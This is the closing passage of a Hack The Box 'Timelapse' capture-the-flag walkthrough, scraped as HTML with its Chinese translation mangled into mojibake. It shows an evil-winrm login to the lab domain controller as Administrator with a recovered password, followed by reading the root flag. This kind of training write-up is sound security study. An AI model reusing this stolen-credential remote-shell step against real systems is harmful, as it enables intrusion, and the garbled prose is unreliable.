C:\Users\svc_deploy\Documents&gt; hostname<br/>dc01</span></pre><h1 id="28f2" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">æ ¹æ ‡å¿—</h1><p id="751d" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">æˆ‘ä»¬æœ‰æœ¬åœ°ç®¡ç†å‘˜å¯†ç ï¼Œæˆ‘ä»¬çŸ¥é“æˆ‘ä»¬åœ¨ä¸ä¹‹ç›¸å…³çš„DC01ç®±ä¸Šã€‚è®©æˆ‘ä»¬è·³å‡ºè¿™ä¸ªå¤–å£³ï¼Œä»¥ç®¡ç†å‘˜èº«ä»½è¿æ¥:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="3580" class="mu kg iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/timelapse]<br/>â””â”€# evil-winrm -i 10.10.11.152 -u Administrator -p '1;s(T[,8/k6k8+n1e8Jh+Q@r' -S       <br/><br/>Evil-WinRM shell v3.3<br/>Warning: SSL enabled<br/>Info: Establishing connection to remote endpoint<br/>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</span></pre><p id="5871" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">è®©æˆ‘ä»¬æŠ“ä½æ ¹æ——æ¥å®Œæˆè¿™ä¸ªç›’å­:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="c078" class="mu kg iq mq b gy mv mw l mx my">*Evil-WinRM* PS C:\Users&gt; type trx\desktop\root.txt<br/>3b0e8ff4e0ba0e044abaf52dd07d342d</span></pre><p id="6ee3" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å®Œæˆäº†ã€‚ä¸‹æ¬¡è§ã€‚</p></div><div class="ab cl nd ne hu nf" role="separator"><span class="ng bw bk nh ni nj"/><span class="ng bw bk nh ni nj"/><span class="ng bw bk nh ni"/></div><div class="ij ik il im in"><p id="56b5" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å¦‚æœä½ å–œæ¬¢è¿™ç¯‡æ–‡ç« ï¼Œè¯·ç»™æˆ‘ä¸€ä¸¤ä¸ªæŒå£°(è¿™æ˜¯å…è´¹çš„ï¼)</p><p id="af85" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æ¨ç‰¹â€”<a class="ae na" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>ç½‘ç«™â€” <a class="ae na" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="37e2" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated"><em class="nk">åŸè½½äº2022å¹´8æœˆ22æ—¥</em><a class="ae na" href="https://pencer.io/ctf/ctf-htb-timelapse/" rel="noopener ugc nofollow" target="_blank"><em class="nk">https://pencer . io</em></a><em class="nk">ã€‚</em></p></div><div class="ab cl nd ne hu nf" role="separator"><span class="ng bw bk nh ni nj"/><span class="ng bw bk nh ni nj"/><span class="ng bw bk nh ni"/></div><div class="ij ik il im in"><h2 id="d546" class="mu kg iq bd kh nl nm dn kl nn no dp kp ls np nq kr lw nr ns kt ma nt nu kv nv bi translated">æ¥è‡ªInfosecçš„æŠ¥é“:Infosecæ¯å¤©éƒ½æœ‰å¾ˆå¤šå†…å®¹ï¼Œå¾ˆéš¾è·Ÿä¸Šã€‚<a class="ae na" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">åŠ å…¥æˆ‘ä»¬çš„æ¯å‘¨ç®€è®¯</a>ä»¥5ç¯‡æ–‡ç« ã€4ä¸ªçº¿ç¨‹ã€3ä¸ªè§†é¢‘ã€2ä¸ªGithub Reposå’Œå·¥å…·ä»¥åŠ1ä¸ªå·¥ä½œæé†’çš„å½¢å¼å…è´¹è·å–æ‰€æœ‰æœ€æ–°çš„Infosecè¶‹åŠ¿ï¼</h2></div></div>    
</body>
</html>